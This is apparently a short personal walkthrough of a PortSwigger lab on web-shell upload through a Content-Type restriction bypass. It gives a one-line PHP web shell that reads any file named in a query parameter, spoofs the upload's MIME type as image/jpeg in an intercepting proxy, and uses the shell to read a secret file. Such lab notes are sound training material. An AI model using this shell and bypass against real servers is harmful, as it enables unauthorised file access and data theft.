https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

This lab contains a vulnerable image upload function.
upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret


1) write a exploit.php file that contains 
    <?php echo file_get_contents($_GET['filepath']); ?>

2) upload it as image,
    the website blocks it and says that image/jpeg and image/png are allowed

3) open the POST request to /avatar in ZAP and change in body Content-Type: application/x-php to
    Content-Type: image/jpeg

    NOTE: DON'T DELETE COMPLETELY THE line but insert it char by char

4) send the POST and the file is uploaded

3) open the image in another tab and add the query parameter to have 
    /files/avatars/exploit.php?filepath=/home/carlos/secret

4) done

NOTE: Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved.
